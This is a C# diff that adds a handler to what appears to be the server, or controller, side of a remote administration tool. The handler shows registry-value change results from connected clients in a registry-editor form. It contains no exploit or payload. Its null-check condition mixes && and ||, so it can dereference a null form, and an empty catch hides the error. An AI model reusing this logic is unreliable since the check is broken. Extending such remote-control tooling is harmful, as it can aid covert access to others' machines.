@@ -153,6 +153,26 @@ namespace xServer.Core.Commands
             catch { }
         }
 
+        public static void HandleChangeRegistryValue(xServer.Core.Packets.ClientPackets.GetChangeRegistryValueResponse packet, Client client)
+        {
+            try
+            {
+                // Make sure that the client is in the correct state to handle the packet appropriately.
+                if (client != null && client.Value.FrmRe != null && !client.Value.FrmRe.IsDisposed || !client.Value.FrmRe.Disposing)
+                {
+                    if (!packet.IsError)
+                    {
+                        client.Value.FrmRe.ChangeValueFromList(packet.KeyPath, packet.Value);
+                    }
+                    else
+                    {
+                        client.Value.FrmRe.ShowErrorMessage(packet.ErrorMsg);
+                    }
+                }
+            }
+            catch { }
+        }
+
         #endregion
     }
 }
